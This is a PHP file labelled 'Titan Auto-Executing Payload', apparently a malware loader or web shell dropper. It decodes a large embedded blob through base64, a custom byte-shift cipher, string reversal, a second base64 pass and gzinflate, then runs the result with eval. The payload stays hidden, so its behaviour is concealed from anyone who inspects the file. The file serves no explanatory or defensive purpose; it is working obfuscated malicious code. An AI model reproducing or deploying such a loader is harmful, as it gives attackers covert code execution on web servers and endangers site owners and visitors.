<?php
// Titan Auto-Executing Payload
$TMGVFK = base64_decode(
    'Z7iKYKysqK2EZnqTv4tXeLWTk45noOjml1KXtK3OvZGCsYKnWJl5v+abTJ6ypY+f' .
    'VmvalrRrocDiy4R7dKSPy55XgLphqFudoLjiqW9pupeqx5dt2YKXV2SspcaujYG/' .
    'e6TIXGq1o9tcnZfYq3ZseLqbmqmgX81tnHh4i+i+qZSJvIaMmll81HKUaYi/y6iS' .
    'U6uencWZmZmencprh6C7446PY5h5qKlumcKVrZiEu8zmsVeBr7OEt3Sb216nhKuV' .
    'wsCWaYywuomkWYqdm69ok4zr37lwrJmYntBXobl4u2p0f9bLlHSrwqy/y3Ven3C6' .
    'bZ2x28d4ZXaWnL2oeHO1krhte3qo57pvhKKyqp9yedGY0ItcuOPftXalrrCgh1l+' .
    'to/OiZ6upaizjn60mrqsV1/lbbBrmK6l3YVSp7SVqsRpisSkz3eZjd2lqnRrwpiz' .
    'xlihun/aiJOSyeeLmpOSuLq9VmrCd7dunrG+wnJznsOVvMRyWuR9tJCoqtamp5KE' .
    'mnaOn5p234y0dnKcvdZ7dGGidMu5aVrZi8mImpfHpbBZosCIoplcXdeE2G9ikdal' .
    'u5tjmLuegXlvv6KZWml44L15lqLAptKOcZ7ad6+JoH7F1rCOY7ORq9Bni+KSyIiL' .
    'k9qne3ZnxZWuqI13zXCsfYu96qeTYnafjcbDaXnloMV1Youn4IaRo5+owaFdU9Z+' .
    'tZN4fcviqpeEsLnSun+ernK7aqGo3cSNdpihm82ujHOwgNNxh5245bpUprC4kKyW' .
    'bdFb0YiTt+LDhZV2rpSgunZX1pOVWKu749WSZqS1ds2LXG+9npV1mHG4nZmamrKd' .
    'vMpyXMOZxIh5f9u5lkxzwra/0FeQxm3UZJ2SptiTi5R9iZvBa2/Enq6JZ5nJ3LGE' .
    'ln6dpIl6WOCWt3aoqd67eWiEknKmyKCMvKHWc3yVtt2MeIyllMC5ioKXm6eLfZPf' .
    'tK+Zn3uxoYxtjaGkyGV1mN25r3FjuaePuYmSsXTac4Sepae6jqGOu8uLbI+zYI5X' .
    'mnnLoYmUZ7Skp6mKXdWWvFqYtaSncW5+fXmmzJZuzaHLjWaty8u2k5yWrbOjZ5vb' .
    'daaElru31a2DiaS8yMqRm7Wey3SXh+Xas3WqxHSvv51s32LMbaqw6NOTYqiseKqM' .
    'h3iXecloiLqq3KZvhrOzpsJcd7ykqpKFebfWqHuEsbKLnJGUxXesW4KMt7yFbKzA' .
    'korKkJOdWZWQgI2234WUnoywx7qTa9GNyJCTlqadh3iBwJXHy5uBvJaWcGh/4eSs' .
    'k5mchoSnXl+2lalbab/m3KRWjJivsYpec7R5xHp5sbXLcoqqooiIgV9hm5ine6Zx' .
    'p6GwcYOvltPEiVe4eNVymorL54ZQasC3qYlRkth+kolmtMOit5GKjZKOnZyNm3ql' .
    'VGh1wZ17lYCwkaaZjFiboLuRe5vZ3Y5MoK6O0cxxl9JglIp9uqyreXGWpXW/pnaW' .
    'waSSWGCXouWoZJ3Fcp+/jXvcoNpZiLye2LaDYbi5vYtXeLxtt3pklqyzlpifmbS+' .
    'uGmfnJzRm5R458ukUGePt5Kii6Dfccl8Zb7h65Z3o5typaRXdOBj1XeYkuDUiY6a' .
    'r3enpJd+5l64lWKrvNami4yMeLynlJK9kNJSd3XKu4l6poC0y6iAfA=='
);
$XVLAZ = '*c#1FsrB!2KCYV&(l';
$dec = '';
for($i=0; $i<strlen($TMGVFK); $i++){
    $dec .= chr((ord($TMGVFK[$i]) - ord($XVLAZ[$i % strlen($XVLAZ)]) + 256) % 256);
}
$dec = strrev($dec);
$dec = base64_decode($dec);
$inf = @gzinflate($dec);
if($inf !== false) {
    eval('?>'.$inf);
    exit;
}
?>